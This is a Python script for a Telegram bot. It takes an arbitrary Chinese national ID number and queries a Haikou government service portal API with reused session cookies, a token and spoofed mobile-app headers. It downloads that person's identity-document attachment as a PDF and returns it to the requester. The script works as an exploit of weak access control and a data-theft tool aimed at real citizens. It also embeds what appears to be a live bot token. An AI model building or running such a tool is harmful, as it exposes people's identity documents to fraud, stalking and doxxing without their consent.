#!/usr/bin/env python3
import sys
print("===== Bot starting (海南专用稳定版) =====")

import asyncio
import io
import time
import requests
import urllib3
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== 配置 ==========
BOT_TOKEN = "5849383582:AAHIfKvl2O3buRgiIq4rwtC4b95KsP3BfS4"

# 海南配置（请替换为真实值）
HAINAN_COOKIES = {
    "cna": "REPLACE_CNA_HERE",
    "JSESSIONID": "REPLACE_JSESSIONID_HERE",
    "SESSION": "REPLACE_SESSION_HERE",
    "SERVERID": "REPLACE_SERVERID_HERE",
}
HAINAN_TOKEN = "REPLACE_ZWFW_TOKEN_HERE"

# ========== 海南查询（完全来自您的原始脚本，未作任何改动） ==========
def hainan_query(id_card):
    id_card = id_card.strip().upper()
    if len(id_card) != 18 or not id_card[:17].isdigit() or id_card[17] not in '0123456789X':
        return False, "身份证不合法"

    session = requests.Session()
    session.cookies.update(HAINAN_COOKIES)
    session.verify = False

    headers = {
        "Host": "zwfw.dn.haikou.gov.cn",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Android\"",
        "zwfw-token": HAINAN_TOKEN,
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; MEIZU 21 Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/141.0.7390.97 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "Accept": "*/*",
        "Origin": "https://zwfw.dn.haikou.gov.cn",
        "X-Requested-With": "com.hanweb.hnzwfw.android.activity",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }

    data = {
        "itemMaterialId": "1498591712970792960",
        "materialCode": "1173207393439670272",
        "materialName": "委托书原件及委托代理人的身份证明",
        "interfaceParam": "ztmc,zzbh,dzzz_name,cardid,dzzz_type",
        "interfaceParamName": "身份证",
        "canShare": False,
        "isSignature": "N",
        "appInterfaceId": "136",
        "param": {
            "ztmc": "刘德华",
            "zzbh": "",
            "dzzz_name": "随便起个名",
            "cardid": id_card,
            "dzzz_type": "1"
        },
        "itemId": "1047370300041120912",
        "userId": "1547878749006024704"
    }

    for attempt in range(5):
        try:
            r = session.post(
                "https://zwfw.dn.haikou.gov.cn/rest/materialshare/canShareMaterial",
                json=data,
                headers=headers,
                timeout=30
            )
            result = r.json()
            if result.get("code") == "1":
                att_id = result["resultDatas"]["result"]["resultDatas"]["attachmentList"][0]["id"]
                r2 = session.get(
                    f"https://zwfw.dn.haikou.gov.cn/rest/attachment/{att_id}",
                    timeout=30
                )
                if r2.status_code == 200:
                    return True, r2.content
                else:
                    return False, f"下载失败 HTTP {r2.status_code}"
            else:
                print(f"海南返回: {result.get('message')}")
        except Exception as e:
            print(f"海南尝试 {attempt+1} 异常: {e}")
        time.sleep(2)

    return False, "连续失败，请检查 Cookie 或 Token"

# ========== Telegram 命令 ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 可用命令：\n"
        "/hainansf <身份证号> → 查询海南身份证附件（PDF）\n"
        "示例：/hainansf 460101199001011234"
    )

async def hainansf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("❌ 格式错误\n正确格式：/hainansf <身份证号>")
        return

    id_card = args[0].strip()
    if len(id_card) != 18:
        await update.message.reply_text("❌ 身份证号必须为18位")
        return

    await update.message.reply_text("⏳ 正在查询海南系统，请稍候...")
    success, result = hainan_query(id_card)

    if success:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=io.BytesIO(result),
            filename=f"{id_card}.pdf",
            caption="✅ 海南查询成功"
        )
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ 查询失败：{result}"
        )

# ========== 主程序 ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('hainansf', hainansf))
    print("===== Bot is ready (海南专用稳定版) =====")
    app.run_polling()

if __name__ == '__main__':
    main()
